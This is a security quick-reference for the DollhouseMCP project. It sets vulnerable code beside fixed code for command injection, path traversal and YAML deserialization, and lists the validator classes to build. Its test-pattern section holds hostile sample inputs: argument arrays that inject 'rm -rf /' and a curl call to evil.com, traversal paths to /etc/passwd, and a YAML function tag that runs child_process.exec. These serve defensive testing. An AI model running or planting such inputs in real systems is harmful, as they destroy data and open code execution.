# Security Quick Reference - DollhouseMCP

## Critical Vulnerabilities to Fix

### 1. Command Injection (#199)
```typescript
// VULNERABLE:
exec(`git pull ${userInput}`);

// SECURE:
CommandValidator.secureExec('git', ['pull']);
```

### 2. Path Traversal (#200)
```typescript
// VULNERABLE:
const path = `./personas/${userInput}`;

// SECURE:
const path = await PathValidator.validatePersonaPath(userInput);
```

### 3. YAML Deserialization (#201)
```typescript
// VULNERABLE:
const data = yaml.load(userYaml);

// SECURE:
const data = YamlValidator.parsePersonaMetadataSafely(userYaml);
```

## Security Test Commands
```bash
# Run critical security tests only
npm run security:critical

# Run all security tests
npm run security:all

# Pre-commit validation
npm run pre-commit

# Generate security report
npm run security:report
```

## Key Security Classes to Implement

### CommandValidator
- Whitelist allowed commands
- Validate all arguments
- Use spawn, not exec
- Restrict environment

### PathValidator
- Resolve to absolute paths
- Check against allowed directories
- Block traversal patterns
- Validate filenames

### YamlValidator
- Use CORE_SCHEMA only
- Zod schema validation
- Block code execution tags
- Sanitize output

### InputValidator
- Type validation
- Length limits
- Pattern matching
- Sanitization

### FileLockManager
- Prevent race conditions
- Atomic operations
- Timeout protection
- Deadlock prevention

## Vulnerable Patterns to Find

### Command Execution
```typescript
// Look for:
exec(), execSync()
child_process.exec
spawn with shell: true
```

### File Operations
```typescript
// Look for:
fs.readFile(userInput)
path.join('./personas', userInput)
No path validation
```

### YAML Parsing
```typescript
// Look for:
yaml.load()
gray-matter without safe options
No schema validation
```

## Test Patterns

### Command Injection Test
```typescript
const malicious = [
  ['git', ['pull', '&&', 'rm', '-rf', '/']],
  ['npm', ['install', ';', 'curl', 'evil.com']]
];
```

### Path Traversal Test
```typescript
const malicious = [
  '../../../etc/passwd',
  '..\\..\\windows\\system32',
  'personas/../../../secret'
];
```

### YAML Exploit Test
```typescript
const malicious = `
name: !!js/function "function(){require('child_process').exec('bad')}"
`;
```

## Priority Order
1. **Security test framework** - Can't fix without tests
2. **Command injection** - RCE vulnerability
3. **Path traversal** - File system access
4. **YAML deserialization** - Code execution
5. **Input validation** - Prevent all injections
6. **File locking** - Data integrity

## GitHub Issues
- #199: Command Injection
- #200: Path Traversal  
- #201: YAML RCE
- #202: Token Security
- #203: Input Validation
- #204: Race Conditions
- #205: Security Testing
- #206: Error Disclosure
- #207: Rate Limiting
- #208: Session Management

## Audit Files
- `/Users/mick/Developer/MCP-Servers/Notes/Audit-July-11th-2025/dollhousemcp_security_audit.md`
- `/Users/mick/Developer/MCP-Servers/Notes/Audit-July-11th-2025/dollhousemcp_testing_infrastructure.md`